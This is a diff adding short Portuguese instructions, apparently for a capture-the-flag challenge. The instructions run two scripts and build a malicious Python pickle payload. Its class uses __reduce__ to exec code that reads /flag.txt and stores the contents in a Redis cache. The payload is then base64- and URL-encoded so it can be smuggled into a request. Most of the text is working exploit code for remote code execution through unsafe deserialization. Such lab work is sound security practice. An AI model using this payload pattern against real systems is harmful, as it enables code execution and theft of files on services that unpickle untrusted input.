@@ -1,0 +1,36 @@
+Instruções:
+
+
+poc_read_flag_internal.sh
+
+export MYUID="1a5d017c-ebe2-4362-97e6-3ec4835801c8"
+./poc_read_flag_internal.sh
+
+
+smuggle_flag.sh
+
+# 1) Reaproveite o MYUID já obtido
+export MYUID="1a5d017c-ebe2-4362-97e6-3ec4835801c8"
+
+# 2) Gere o mesmo payload malicioso URL-encoded:
+export DATA_URL_MAL="$(python3 - <<'PY'
+import base64, pickle, builtins, urllib.parse
+code = r"""
+import redis
+r = redis.Redis(host='cache-storage', port=6379, encoding='utf-8', decode_responses=True)
+try:
+    data = open('/flag.txt','r').read()
+except Exception as e:
+    data = f'ERR:{e}'
+r.set('leak', data)
+"""
+class Evil:
+    def __reduce__(self):
+        return (builtins.exec, (code,))
+print(urllib.parse.quote(base64.b64encode(pickle.dumps(Evil())).decode(), safe=''))
+PY
+)"
+
+# 3) Rodar o smuggling
+./smuggle_flag.sh
+
